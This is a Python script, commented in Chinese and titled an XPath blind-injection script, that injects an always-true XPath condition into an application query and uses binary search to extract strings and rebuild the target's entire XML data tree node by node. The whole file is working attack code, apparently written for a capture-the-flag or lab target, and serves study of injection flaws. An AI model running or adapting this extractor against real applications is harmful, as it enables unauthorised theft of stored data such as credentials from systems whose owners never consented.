#!/usr/bin/python3

# XPath盲注脚本 by Sunshine
import requests
import json
import sys
import time
from urllib.parse import quote, urlencode
import app
import hashlib

# 预言机
def oracle(expression):
    return app.query(f"nonexist' or {expression} and '1'='1")

# 二分法获取整数值
def BisectionGetInteger(target):
    low = 0
    high = 50
    while low < high:
        mid = (low + high) // 2
        if oracle(f"{target}>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low

# 二分法获取字符串
def BisectionGetString(target):
    length = BisectionGetInteger(f'string-length({target})') # 先探测字符串长度
    #print(f'-| [BINARY SEARCH] Length: {length} | Result: ', end='')
    sys.stdout.flush()
    if length == 0: # 字符串为空直接返回
        return ""

    alphabets = "~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_.-:"
    string = ""
    for i in range(1, length + 1):
        low = 0
        high = len(alphabets) - 1
        while low < high:
            mid = (low + high) // 2
            expression = f'string-length(substring-before("{alphabets}", substring({target},{i},1)))>{mid}'
            if oracle(expression):
                low = mid + 1
            else:
                high = mid
        if low == 0: # 字符不在字符表内
            string += "?" # 未知字符
            #print(f'?', end='')
            #sys.stdout.flush()
        else: # 字符在字符表内
            string += alphabets[low]
            #print(f'{alphabets[low]}', end='')
            #sys.stdout.flush()
    #print("")
    return string

# 递归还原XML树状结构
def RecurselyBuildStructure(dict, path):
    # Tips: 这里先判断是否有子节点 再获取数量 而不是先获取数量 再判断数量是否等于0
    # 因为末端节点很多 二分获取数量需要发送多个请求 而调用预言机只发送一个请求
    # 能省很多时间 特别是时间盲注时
    if oracle(f"count({path}*)=0"): # 如果没有子节点 可能是个文本节点
        text = BisectionGetString(path[:-1]) # 去掉路径最后的/
        dict["text"] = text
        #print(f'[递归扫描] {path}没有子节点')
        return
    ChildCount = BisectionGetInteger(f'count({path}*)') # 获取子节点数量
    #print(f'[递归扫描] 发现{path}有{ChildCount}个子节点')

    while ChildCount != 0: # 逐个枚举子节点
        NextElement = f'{path}*[{ChildCount}]' # 拼接节点路径
        ElementName = BisectionGetString(f'name({NextElement})') # 获取节点名
        NextDict = {} # 存放子节点数据的字典
        NextPath = f'{NextElement}/' # 拼接路径
        #print(f'[递归扫描] 进入{NextPath} | 节点名{ElementName}')
        RecurselyBuildStructure(NextDict, NextPath) # 递归进入子节点
        md5sum = hashlib.md5(json.dumps(NextDict, separators=(",", ":")).encode("utf-8")).hexdigest()
        DictName = f'{ElementName}.{md5sum}' # 计算哈希 防止同名节点 并去重
        dict[DictName] = NextDict
        ChildCount = ChildCount - 1 # 枚举下一个子节点
    return

dict = {}
path = '/' # 根节点作为递归起点
RecurselyBuildStructure(dict, path)

import pprint
pprint.pprint(dict)
